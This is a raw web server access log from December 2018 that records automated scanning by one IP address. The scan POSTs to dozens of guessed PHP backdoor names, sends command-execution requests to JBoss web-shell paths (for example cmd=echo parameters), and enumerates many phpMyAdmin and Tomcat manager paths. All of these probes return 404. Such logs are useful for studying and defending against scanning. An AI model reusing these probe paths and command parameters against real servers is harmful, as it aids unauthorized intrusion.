132.232.17.193 - - [18/Dec/2018:12:16:49 +0000] "POST /xiaomae.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:49 +0000] "POST /xiaomar.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:50 +0000] "POST /qq.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:50 +0000] "POST /data.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:50 +0000] "POST /log.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:50 +0000] "POST /fack.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:51 +0000] "POST /angge.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:52 +0000] "POST /cxfm666.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:53 +0000] "POST /db.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:53 +0000] "POST /hacly.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:53 +0000] "POST /xiaomo.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:54 +0000] "POST /xiaoyu.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:54 +0000] "POST /xiaohei.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:54 +0000] "POST /j.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:54 +0000] "POST /qq5262.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:55 +0000] "POST /MCLi.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:56 +0000] "POST /MCLi.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:56 +0000] "POST /51.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:16:58 +0000] "POST /cadre.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:01 +0000] "POST /mm.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:02 +0000] "POST /test.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:04 +0000] "POST /1q.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:05 +0000] "GET /jexsw2/jexsw2.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:05 +0000] "GET /jexws2/jexws2.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:07 +0000] "GET /jexws3/jexws3.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:09 +0000] "GET /jexws4/jexws4.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:09 +0000] "GET /jexinv/jexinv.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:09 +0000] "GET /jexinv3/jexinv3.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:10 +0000] "GET /jexinv4/jexinv4.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:11 +0000] "GET /jbossass/jbossass.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "jexboss"
132.232.17.193 - - [18/Dec/2018:12:17:13 +0000] "GET /console/jspzxc.jsp?cmd=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:13 +0000] "GET /demo/404.jsp?bjh=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:13 +0000] "GET /dread/lock.jsp?tezaz=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:14 +0000] "GET /jbws/jbws.jsp?eval=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "jbosses"
132.232.17.193 - - [18/Dec/2018:12:17:15 +0000] "GET /jvrx/cmd.jsp?pwd=everymorning&cmd=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:17 +0000] "GET /shellinvoker/shellinvoker.jsp?ppp=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "jexboss"
132.232.17.193 - - [18/Dec/2018:12:17:17 +0000] "GET /zecmd/zecmd.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:17 +0000] "GET /iesvc/iesvc.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:21 +0000] "GET /idssvc/idssvc.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:21 +0000] "GET /wstats/wstats.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:23 +0000] "GET /HCEGH/xunfeng.jsp?comment=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:24 +0000] "GET /a/pwn.jsp?cmd=echo%20Hello%20D3c3mb3r HTTP/1.1" 404 178 "-" "test"
132.232.17.193 - - [18/Dec/2018:12:17:25 +0000] "GET /index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:25 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:26 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:26 +0000] "GET /pmd/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:27 +0000] "GET /pma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:29 +0000] "GET /PMA/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:29 +0000] "GET /PMA2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:29 +0000] "GET /pmamy/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:30 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:30 +0000] "GET /mysql/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:30 +0000] "GET /admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:30 +0000] "GET /db/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:31 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:33 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:33 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:33 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:34 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:34 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:34 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:34 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:37 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:37 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:37 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:38 +0000] "GET /mysql_admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:38 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:40 +0000] "GET /phpAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:41 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:41 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:42 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:43 +0000] "GET /phpMyAdmin-4.4.0/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:44 +0000] "GET /myadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:45 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:45 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:46 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:46 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:46 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:47 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:47 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:48 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:49 +0000] "GET /pma-old/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:49 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:50 +0000] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:50 +0000] "GET /phpma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:50 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:51 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:51 +0000] "GET /phpMyAbmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:51 +0000] "GET /phpMyAdmin__/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:52 +0000] "GET /phpMyAdmin+++---/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:52 +0000] "GET /v/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:52 +0000] "GET /phpmyadm1n/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:53 +0000] "GET /phpMyAdm1n/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:53 +0000] "GET /shaAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:54 +0000] "GET /phpMyadmi/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:57 +0000] "GET /phpMyAdmion/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:57 +0000] "GET /MyAdmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:57 +0000] "GET /phpMyAdmin1/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:17:58 +0000] "GET /phpMyAdmin123/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:00 +0000] "GET /pwd/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:01 +0000] "GET /phpMyAdmina/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:01 +0000] "GET /program/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:01 +0000] "GET /shopdb/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:02 +0000] "GET /phppma/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:04 +0000] "GET /phpmy/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:05 +0000] "GET /mysql/admin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:05 +0000] "GET /mysql/dbadmin/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:07 +0000] "GET /mysql/sqlmanager/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:08 +0000] "GET /mysql/mysqlmanager/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:09 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
132.232.17.193 - - [18/Dec/2018:12:18:10 +0000] "GET /manager/html HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
5.188.210.12 - - [18/Dec/2018:12:18:54 +0000] "\x04\x01\x00P\x05\xBC\xD2\x0C\x00" 400 182 "-" "-"
176.122.215.8 - - [18/Dec/2018:12:19:39 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
5.188.210.12 - - [18/Dec/2018:12:20:08 +0000] "GET http://5.188.210.12/echo.php HTTP/1.1" 404 209 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
54.190.49.212 - - [18/Dec/2018:12:48:21 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
173.212.225.214 - - [18/Dec/2018:12:57:15 +0000] "GET //recordings/ HTTP/1.1" 404 152 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.14.4.el7.x86_64"
70.42.131.170 - - [18/Dec/2018:13:03:21 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
